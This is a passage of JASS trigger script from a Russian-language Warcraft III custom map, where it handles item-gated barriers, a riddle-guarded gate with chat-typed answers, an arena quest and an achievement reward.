endfunction
function BaX takes nothing returns nothing
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49303930))
call KillDestructable(HR)
call KillDestructable(HU)
call KillDestructable(HV)
call KillDestructable(HT)
call KillDestructable(HS)
endfunction
function BaY takes nothing returns nothing
set cg=CreateTrigger()
call TriggerRegisterEnterRectSimple(cg,Gl)
call TriggerAddCondition(cg,Condition(function BaW))
call TriggerAddAction(cg,function BaX)
endfunction
function BaZ takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304D47)==true) then
return false
endif
return true
endfunction
function Baa takes nothing returns nothing
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304D47))
call KillDestructable(Hs)
call KillDestructable(Hl)
call KillDestructable(Hm)
endfunction
function Bab takes nothing returns nothing
set ch=CreateTrigger()
call TriggerRegisterEnterRectSimple(ch,Fj)
call TriggerAddCondition(ch,Condition(function BaZ))
call TriggerAddAction(ch,function Baa)
endfunction
function Bac takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bad takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call CreateDestructableLoc($42303048,GetRectCenter(Fi),GetRandomDirectionDeg(),2.5,0)
call DisplayTextToForce(GetPlayersAll(),"Горит... дальше не пройти.")
call EnableTrigger(cj)
endfunction
function Bae takes nothing returns nothing
set ci=CreateTrigger()
call TriggerRegisterEnterRectSimple(ci,Fi)
call TriggerAddCondition(ci,Condition(function Bac))
call TriggerAddAction(ci,function Bad)
endfunction
function Baf takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49303130)==true) then
return false
endif
return true
endfunction
function Bag takes nothing returns boolean
return GetDestructableTypeId(GetFilterDestructable())==$42303048
endfunction
function Bah takes nothing returns nothing
call RemoveDestructable(GetEnumDestructable())
endfunction
function Bai takes nothing returns nothing
call EnableTrigger(ck)
call DisplayTextToForce(GetPlayersAll(),"Костер потушен!")
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49303130))
call KillDestructable(Hi)
call KillDestructable(Hj)
call KillDestructable(Hk)
call EnumDestructablesInRect(Fi,Condition(function Bag),function Bah)
call ModifyGateBJ(bj_GATEOPERATION_CLOSE,HX)
call ShowDestructable(HX,true)
call ShowUnit(Jb,true)
endfunction
function Baj takes nothing returns nothing
set cj=CreateTrigger()
call DisableTrigger(cj)
call TriggerRegisterEnterRectSimple(cj,Fi)
call TriggerAddCondition(cj,Condition(function Baf))
call TriggerAddAction(cj,function Bai)
endfunction
function Bak takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6830354C) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function Bal takes nothing returns boolean
if not (Tu==1) then
return false
endif
return true
endfunction
function Bam takes nothing returns boolean
if not (Tu==2) then
return false
endif
return true
endfunction
function Ban takes nothing returns boolean
if not (Tu==3) then
return false
endif
return true
endfunction
function Bao takes nothing returns boolean
if not (Tu==4) then
return false
endif
return true
endfunction
function Bap takes nothing returns boolean
if not (Tu==5) then
return false
endif
return true
endfunction
function Baq takes nothing returns boolean
if not (Tu==6) then
return false
endif
return true
endfunction
function Bar takes nothing returns boolean
if not (Tu==7) then
return false
endif
return true
endfunction
function Bas takes nothing returns boolean
if not (Tu==8) then
return false
endif
return true
endfunction
function Bat takes nothing returns boolean
if not (Tu==9) then
return false
endif
return true
endfunction
function Bau takes nothing returns boolean
if not (Tu==10) then
return false
endif
return true
endfunction
function Bav takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
set Tu=GetRandomInt(1,10)
if Bal() then
call EnableTrigger(cl)
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Всезнающий: ну-ну, привет. Дальше - только с моего разрешения. Отгадаете мою загадку: открою ворота.

Темная комната. Перед вами свеча, керосиновая лампа и газовая плита. Что вы зажжёте в первую очередь?

|c0000ff00Подсказка:|r ответ - одно слово. Ответ писать с префиксом |c00ff7f00-|r. У Вас есть 2 минуты. Время пошло!")
else
endif
if Bam() then
call EnableTrigger(cl)
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Всезнающий: ну-ну, привет. Дальше - только с моего разрешения. Отгадаете мою загадку: открою ворота.

Есть 7 братьев. У каждого брата есть сестра. Сколько всего сестер?

|c0000ff00Подсказка:|r ответ - одно число. Ответ писать с префиксом |c00ff7f00-|r. У Вас есть 2 минуты. Время пошло!")
else
endif
if Ban() then
call EnableTrigger(cl)
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Всезнающий: ну-ну, привет. Дальше - только с моего разрешения. Отгадаете мою загадку: открою ворота.

Сколько раз встречается цифра 4 в целых числах от 1 до 50?

|c0000ff00Подсказка:|r ответ - одно число. Ответ писать с префиксом |c00ff7f00-|r. У Вас есть 2 минуты. Время пошло!")
else
endif
if Bao() then
call EnableTrigger(cl)
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Всезнающий: ну-ну, привет. Дальше - только с моего разрешения. Отгадаете мою загадку: открою ворота.

У отца Люси 5 дочерей: Чача, Чече, Чичи, Чочо. Как зовут пятую дочь?

|c0000ff00Подсказка:|r ответ - имя с большой буквы. Ответ писать с префиксом |c00ff7f00-|r. У Вас есть 2 минуты. Время пошло!")
else
endif
if Bap() then
call EnableTrigger(cl)
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Всезнающий: ну-ну, привет. Дальше - только с моего разрешения. Отгадаете мою загадку: открою ворота.

Пара лошадей пробежала 20 километров. Вопрос: сколько километров пробежала каждая лошадь в отдельности?

|c0000ff00Подсказка:|r ответ - одно число. Ответ писать с префиксом |c00ff7f00-|r. У Вас есть 2 минуты. Время пошло!")
else
endif
if Baq() then
call EnableTrigger(cl)
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Всезнающий: ну-ну, привет. Дальше - только с моего разрешения. Отгадаете мою загадку: открою ворота.

Стоит и ходит, висит и стоит, ходит и лежит?

|c0000ff00Подсказка:|r ответ - одно слово. Ответ писать с префиксом |c00ff7f00-|r. У Вас есть 2 минуты. Время пошло!")
else
endif
if Bar() then
call EnableTrigger(cl)
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Всезнающий: ну-ну, привет. Дальше - только с моего разрешения. Отгадаете мою загадку: открою ворота.

Что у человека может за несколько секунд увеличиться в диаметре в 7 раз?

|c0000ff00Подсказка:|r ответ - одно слово. Ответ писать с префиксом |c00ff7f00-|r. У Вас есть 2 минуты. Время пошло!")
else
endif
if Bas() then
call EnableTrigger(cl)
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Всезнающий: ну-ну, привет. Дальше - только с моего разрешения. Отгадаете мою загадку: открою ворота.

Чем можно поделиться только один раз?

|c0000ff00Подсказка:|r ответ - одно слово. Ответ писать с префиксом |c00ff7f00-|r. У Вас есть 2 минуты. Время пошло!")
else
endif
if Bat() then
call EnableTrigger(cl)
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Всезнающий: ну-ну, привет. Дальше - только с моего разрешения. Отгадаете мою загадку: открою ворота.

Чем больше из неё берёшь, тем больше она становится.

|c0000ff00Подсказка:|r ответ - одно слово. Ответ писать с префиксом |c00ff7f00-|r. У Вас есть 2 минуты. Время пошло!")
else
endif
if Bau() then
call EnableTrigger(cl)
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Всезнающий: ну-ну, привет. Дальше - только с моего разрешения. Отгадаете мою загадку: открою ворота.

Идет то в гору, то с горы, но остается на месте.

|c0000ff00Подсказка:|r ответ - одно слово. Ответ писать с префиксом |c00ff7f00-|r. У Вас есть 2 минуты. Время пошло!")
else
endif
call TriggerSleepAction(180.)
call DisableTrigger(cl)
endfunction
function Baw takes nothing returns nothing
set ck=CreateTrigger()
call DisableTrigger(ck)
call TriggerRegisterAnyUnitEventBJ(ck,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(ck,Condition(function Bak))
call TriggerAddAction(ck,function Bav)
endfunction
function Bax takes nothing returns boolean
if not (IsUnitAliveBJ(Lt)==true) then
return false
endif
return true
endfunction
function Bay takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$68303548
endfunction
function Baz takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function Ba0 takes nothing returns boolean
return GetBooleanAnd(Bay(),Baz())
endfunction
function Ba1 takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function Ba2 takes nothing returns boolean
if not (Tu==1) then
return false
endif
if not (GetEventPlayerChatString()=="-спичку") then
return false
endif
return true
endfunction
function Ba3 takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$68303548
endfunction
function Ba4 takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function Ba5 takes nothing returns boolean
return GetBooleanAnd(Ba3(),Ba4())
endfunction
function Ba6 takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function Ba7 takes nothing returns boolean
if not (Tu==2) then
return false
endif
if not (GetEventPlayerChatString()=="-1") then
return false
endif
return true
endfunction
function Ba8 takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$68303548
endfunction
function Ba9 takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BbB takes nothing returns boolean
return GetBooleanAnd(Ba8(),Ba9())
endfunction
function BbC takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function BbD takes nothing returns boolean
if not (Tu==3) then
return false
endif
if not (GetEventPlayerChatString()=="-15") then
return false
endif
return true
endfunction
function BbE takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$68303548
endfunction
function BbF takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BbG takes nothing returns boolean
return GetBooleanAnd(BbE(),BbF())
endfunction
function BbH takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function BbI takes nothing returns boolean
if not (Tu==4) then
return false
endif
if not (GetEventPlayerChatString()=="-Люси") then
return false
endif
return true
endfunction
function BbJ takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$68303548
endfunction
function BbK takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BbL takes nothing returns boolean
return GetBooleanAnd(BbJ(),BbK())
endfunction
function BbM takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function BbN takes nothing returns boolean
if not (Tu==5) then
return false
endif
if not (GetEventPlayerChatString()=="-20") then
return false
endif
return true
endfunction
function BbO takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$68303548
endfunction
function BbP takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BbQ takes nothing returns boolean
return GetBooleanAnd(BbO(),BbP())
endfunction
function BbR takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function BbS takes nothing returns boolean
if not (Tu==6) then
return false
endif
if not (GetEventPlayerChatString()=="-часы") then
return false
endif
return true
endfunction
function BbT takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$68303548
endfunction
function BbU takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BbV takes nothing returns boolean
return GetBooleanAnd(BbT(),BbU())
endfunction
function BbW takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function BbX takes nothing returns boolean
if not (Tu==7) then
return false
endif
if not (GetEventPlayerChatString()=="-зрачок") then
return false
endif
return true
endfunction
function BbY takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$68303548
endfunction
function BbZ takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function Bba takes nothing returns boolean
return GetBooleanAnd(BbY(),BbZ())
endfunction
function Bbb takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function Bbc takes nothing returns boolean
if not (Tu==8) then
return false
endif
if not (GetEventPlayerChatString()=="-секретом") then
return false
endif
return true
endfunction
function Bbd takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$68303548
endfunction
function Bbe takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function Bbf takes nothing returns boolean
return GetBooleanAnd(Bbd(),Bbe())
endfunction
function Bbg takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function Bbh takes nothing returns boolean
if not (Tu==9) then
return false
endif
if not (GetEventPlayerChatString()=="-яма") then
return false
endif
return true
endfunction
function Bbi takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$68303548
endfunction
function Bbj takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function Bbk takes nothing returns boolean
return GetBooleanAnd(Bbi(),Bbj())
endfunction
function Bbl takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function Bbm takes nothing returns boolean
if not (Tu==10) then
return false
endif
if not (GetEventPlayerChatString()=="-дорога") then
return false
endif
return true
endfunction
function Bbn takes nothing returns nothing
if Ba2() then
call DisableTrigger(GetTriggeringTrigger())
call ModifyGateBJ(bj_GATEOPERATION_OPEN,HX)
call ModifyGateBJ(bj_GATEOPERATION_OPEN,HW)
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Всезнающий: какие молодцы!!! Он ваш!")
call RemoveUnit(Jb)
call EnableTrigger(cm)
call ShowUnitShow(Lt)
call PauseUnitBJ(false,Lt)
call SetUnitPositionLoc(Lt,GetRectCenter(Fo))
call SetUnitOwner(Lt,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Lt,true)
set Tt[7]=85.
set Tt[8]=90.
set Tt[9]=80.
set SR=GetUnitsInRectMatching(Fn,Condition(function Ba0))
call ForGroupBJ(SR,function Ba1)
call DestroyGroup(SR)
else
endif
if Ba7() then
call DisableTrigger(GetTriggeringTrigger())
call ModifyGateBJ(bj_GATEOPERATION_OPEN,HX)
call ModifyGateBJ(bj_GATEOPERATION_OPEN,HW)
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Всезнающий: какие молодцы!!! Он ваш!")
call RemoveUnit(Jb)
call EnableTrigger(cm)
call ShowUnitShow(Lt)
call PauseUnitBJ(false,Lt)
call SetUnitPositionLoc(Lt,GetRectCenter(Fo))
call SetUnitOwner(Lt,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Lt,true)
set Tt[7]=85.
set Tt[8]=90.
set Tt[9]=80.
set SR=GetUnitsInRectMatching(Fn,Condition(function Ba5))
call ForGroupBJ(SR,function Ba6)
call DestroyGroup(SR)
else
endif
if BbD() then
call DisableTrigger(GetTriggeringTrigger())
call ModifyGateBJ(bj_GATEOPERATION_OPEN,HX)
call ModifyGateBJ(bj_GATEOPERATION_OPEN,HW)
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Всезнающий: какие молодцы!!! Он ваш!")
call RemoveUnit(Jb)
call EnableTrigger(cm)
call ShowUnitShow(Lt)
call PauseUnitBJ(false,Lt)
call SetUnitPositionLoc(Lt,GetRectCenter(Fo))
call SetUnitOwner(Lt,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Lt,true)
set Tt[7]=85.
set Tt[8]=90.
set Tt[9]=80.
set SR=GetUnitsInRectMatching(Fn,Condition(function BbB))
call ForGroupBJ(SR,function BbC)
call DestroyGroup(SR)
else
endif
if BbI() then
call DisableTrigger(GetTriggeringTrigger())
call ModifyGateBJ(bj_GATEOPERATION_OPEN,HX)
call ModifyGateBJ(bj_GATEOPERATION_OPEN,HW)
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Всезнающий: какие молодцы!!! Он ваш!")
call RemoveUnit(Jb)
call EnableTrigger(cm)
call ShowUnitShow(Lt)
call PauseUnitBJ(false,Lt)
call SetUnitPositionLoc(Lt,GetRectCenter(Fo))
call SetUnitOwner(Lt,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Lt,true)
set Tt[7]=85.
set Tt[8]=90.
set Tt[9]=80.
set SR=GetUnitsInRectMatching(Fn,Condition(function BbG))
call ForGroupBJ(SR,function BbH)
call DestroyGroup(SR)
else
endif
if BbN() then
call DisableTrigger(GetTriggeringTrigger())
call ModifyGateBJ(bj_GATEOPERATION_OPEN,HX)
call ModifyGateBJ(bj_GATEOPERATION_OPEN,HW)
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Всезнающий: какие молодцы!!! Он ваш!")
call RemoveUnit(Jb)
call EnableTrigger(cm)
call ShowUnitShow(Lt)
call PauseUnitBJ(false,Lt)
call SetUnitPositionLoc(Lt,GetRectCenter(Fo))
call SetUnitOwner(Lt,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Lt,true)
set Tt[7]=85.
set Tt[8]=90.
set Tt[9]=80.
set SR=GetUnitsInRectMatching(Fn,Condition(function BbL))
call ForGroupBJ(SR,function BbM)
call DestroyGroup(SR)
else
endif
if BbS() then
call DisableTrigger(GetTriggeringTrigger())
call ModifyGateBJ(bj_GATEOPERATION_OPEN,HX)
call ModifyGateBJ(bj_GATEOPERATION_OPEN,HW)
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Всезнающий: какие молодцы!!! Он ваш!")
call RemoveUnit(Jb)
call EnableTrigger(cm)
call ShowUnitShow(Lt)
call PauseUnitBJ(false,Lt)
call SetUnitPositionLoc(Lt,GetRectCenter(Fo))
call SetUnitOwner(Lt,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Lt,true)
set Tt[7]=85.
set Tt[8]=90.
set Tt[9]=80.
set SR=GetUnitsInRectMatching(Fn,Condition(function BbQ))
call ForGroupBJ(SR,function BbR)
call DestroyGroup(SR)
else
endif
if BbX() then
call DisableTrigger(GetTriggeringTrigger())
call ModifyGateBJ(bj_GATEOPERATION_OPEN,HX)
call ModifyGateBJ(bj_GATEOPERATION_OPEN,HW)
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Всезнающий: какие молодцы!!! Он ваш!")
call RemoveUnit(Jb)
call EnableTrigger(cm)
call ShowUnitShow(Lt)
call PauseUnitBJ(false,Lt)
call SetUnitPositionLoc(Lt,GetRectCenter(Fo))
call SetUnitOwner(Lt,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Lt,true)
set Tt[7]=85.
set Tt[8]=90.
set Tt[9]=80.
set SR=GetUnitsInRectMatching(Fn,Condition(function BbV))
call ForGroupBJ(SR,function BbW)
call DestroyGroup(SR)
else
endif
if Bbc() then
call DisableTrigger(GetTriggeringTrigger())
call ModifyGateBJ(bj_GATEOPERATION_OPEN,HX)
call ModifyGateBJ(bj_GATEOPERATION_OPEN,HW)
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Всезнающий: какие молодцы!!! Он ваш!")
call RemoveUnit(Jb)
call EnableTrigger(cm)
call ShowUnitShow(Lt)
call PauseUnitBJ(false,Lt)
call SetUnitPositionLoc(Lt,GetRectCenter(Fo))
call SetUnitOwner(Lt,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Lt,true)
set Tt[7]=85.
set Tt[8]=90.
set Tt[9]=80.
set SR=GetUnitsInRectMatching(Fn,Condition(function Bba))
call ForGroupBJ(SR,function Bbb)
call DestroyGroup(SR)
else
endif
if Bbh() then
call DisableTrigger(GetTriggeringTrigger())
call ModifyGateBJ(bj_GATEOPERATION_OPEN,HX)
call ModifyGateBJ(bj_GATEOPERATION_OPEN,HW)
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Всезнающий: какие молодцы!!! Он ваш!")
call RemoveUnit(Jb)
call EnableTrigger(cm)
call ShowUnitShow(Lt)
call PauseUnitBJ(false,Lt)
call SetUnitPositionLoc(Lt,GetRectCenter(Fo))
call SetUnitOwner(Lt,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Lt,true)
set Tt[7]=85.
set Tt[8]=90.
set Tt[9]=80.
set SR=GetUnitsInRectMatching(Fn,Condition(function Bbf))
call ForGroupBJ(SR,function Bbg)
call DestroyGroup(SR)
else
endif
if Bbm() then
call DisableTrigger(GetTriggeringTrigger())
call ModifyGateBJ(bj_GATEOPERATION_OPEN,HX)
call ModifyGateBJ(bj_GATEOPERATION_OPEN,HW)
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Всезнающий: какие молодцы!!! Он ваш!")
call RemoveUnit(Jb)
call EnableTrigger(cm)
call ShowUnitShow(Lt)
call PauseUnitBJ(false,Lt)
call SetUnitPositionLoc(Lt,GetRectCenter(Fo))
call SetUnitOwner(Lt,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Lt,true)
set Tt[7]=85.
set Tt[8]=90.
set Tt[9]=80.
set SR=GetUnitsInRectMatching(Fn,Condition(function Bbk))
call ForGroupBJ(SR,function Bbl)
call DestroyGroup(SR)
else
endif
endfunction
function Bbo takes nothing returns nothing
set cl=CreateTrigger()
call DisableTrigger(cl)
call TriggerRegisterPlayerChatEvent(cl,Player(0),"-",false)
call TriggerRegisterPlayerChatEvent(cl,Player(1),"-",false)
call TriggerRegisterPlayerChatEvent(cl,Player(2),"-",false)
call TriggerRegisterPlayerChatEvent(cl,Player(3),"-",false)
call TriggerRegisterPlayerChatEvent(cl,Player(4),"-",false)
call TriggerRegisterPlayerChatEvent(cl,Player(5),"-",false)
call TriggerRegisterPlayerChatEvent(cl,Player(6),"-",false)
call TriggerRegisterPlayerChatEvent(cl,Player(7),"-",false)
call TriggerAddCondition(cl,Condition(function Bax))
call TriggerAddAction(cl,function Bbn)
endfunction
function Bbp takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bbq takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$68303548
endfunction
function Bbr takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function Bbs takes nothing returns boolean
return GetBooleanAnd(Bbq(),Bbr())
endfunction
function Bbt takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function Bbu takes nothing returns nothing
local integer L9=0
call ModifyGateBJ(bj_GATEOPERATION_OPEN,HX)
call ModifyGateBJ(bj_GATEOPERATION_OPEN,HW)
call SetUnitPositionLoc(Lt,GetRectCenter(Fo))
call SetUnitOwner(Lt,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Lt,true)
call SetUnitLifePercentBJ(Lt,100)
set Tt[7]=85.
set Tt[8]=90.
set Tt[9]=80.
set SR=GetUnitsInRectMatching(Fn,Condition(function Bbs))
call ForGroupBJ(SR,function Bbt)
call DestroyGroup(SR)
call SaveInteger(NY,GetHandleId(Lt),1,0)
loop
call SaveInteger(NY,GetHandleId(Lt),2+L9,0)
set L9=L9+1
exitwhen L9==7
endloop
endfunction
function Bbv takes nothing returns nothing
set cm=CreateTrigger()
call DisableTrigger(cm)
call TriggerRegisterEnterRectSimple(cm,Fi)
call TriggerAddCondition(cm,Condition(function Bbp))
call TriggerAddAction(cm,function Bbu)
endfunction
function Bbw takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6830344D) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function Bbx takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(ca)
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call DestroyEffectBJ(Us[52])
call AddSpecialEffectTargetUnitBJ("overhead",Ks,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[52]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Арена\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 1-50|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Арена","|c006969FFУровень задания: 1-50|r
Каждый уважающий себя Герой должен испытать своё мастерство на Арене, ведь именно для этого она и была создана. Враги Арены меняются каждые 5 уровней, а для входа к ним просто станьте в круг и пропишите |c00ff7f00-бой|r или |c00ff7f00-fight|r. Подробнее об Арене Вы можете прочитать во вкладке |c00ffff00Alt + H|r. Что же я от Вас хочу? Убейте босса своего уровня на Арене, дабы я был уверен, что Вы ознакомились с правилами данного состязания.","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[52]=GetLastCreatedQuestBJ()
endfunction
function Bby takes nothing returns nothing
set cn=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(cn,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(cn,Condition(function Bbw))
call TriggerAddAction(cn,function Bbx)
endfunction
function Bbz takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6830344D) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function Bb0 takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=1) then
return false
endif
return true
endfunction
function Bb1 takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[52])
call QuestSetCompletedBJ(YX[52],true)
call DestroyQuest(YX[52])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00ffff00400 золота|r, |c00ff969610 Кровавых Меток")
set Sf=Sf+1
call RemoveUnit(GetOrderTargetUnit())
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if Bb0() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+1200
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+30
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
endfunction
function Bb2 takes nothing returns nothing
set co=CreateTrigger()
call DisableTrigger(co)
call TriggerRegisterAnyUnitEventBJ(co,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(co,Condition(function Bbz))
call TriggerAddAction(co,function Bb1)
endfunction
function Bb3 takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bb4 takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49305457)==true) then
return false
endif
return true
endfunction
function Bb5 takes nothing returns nothing
call ShowUnit(KB,true)
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"|c0000ffffПриходи, когда добудешь немного кристаллической эссенции.")
if Bb4() then
call DisableTrigger(GetTriggeringTrigger())
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49305457))
call UnitAddAbilityBJ($416E6532,KB)
call UnitAddAbilityBJ($41706974,KB)
else
endif
endfunction
function Bb6 takes nothing returns nothing
set cp=CreateTrigger()
call TriggerRegisterEnterRectSimple(cp,Fv)
call TriggerAddCondition(cp,Condition(function Bb3))
call TriggerAddAction(cp,function Bb5)
endfunction
function Bb7 takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E706E77) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function Bb8 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bb9 takes nothing returns boolean
if not (GetUnitAbilityLevel(GetEnumUnit(),$41304B51)>=1) then
return false
endif
return true
endfunction
function BcB takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=48) then
return false
endif
return true
endfunction
function BcC takes nothing returns nothing
if BcB() then
if Bb9() then
else
call DisplayTextToForce(GetPlayersAll(),GetPlayerName(GetOwningPlayer(GetEnumUnit()))+" получил достижение |c0000ff00\"Всезнающий\"")
call UnitAddAbilityBJ($41304B51,GetEnumUnit())
endif
else
endif
endfunction
function BcD takes nothing returns boolean
if not (Sf>=45) then
return false
endif
return true
endfunction
function BcE takes nothing returns nothing
if BcD() then
call DisableTrigger(GetTriggeringTrigger())
call DisplayTextToForce(GetPlayersAll(),"|c0000ffffПингвин: ура, ура, ура!!! Получите награду!")
call ForGroupBJ(GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function Bb8)),function BcC)
else
call DisplayTextToForce(GetPlayersAll(),"|c0000ffffПингвин|r: выполнили больше 45 заданий? Нет? Так чего вы ждете? 
|c00ff0000Внимание|r: для получения награды требуется герой выше 48 уровня!")
endif
endfunction
function BcF takes nothing returns nothing
set cq=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(cq,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(cq,Condition(function Bb7))
call TriggerAddAction(cq,function BcE)
endfunction
function BcG takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$456D6F6F) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function BcH takes nothing returns boolean
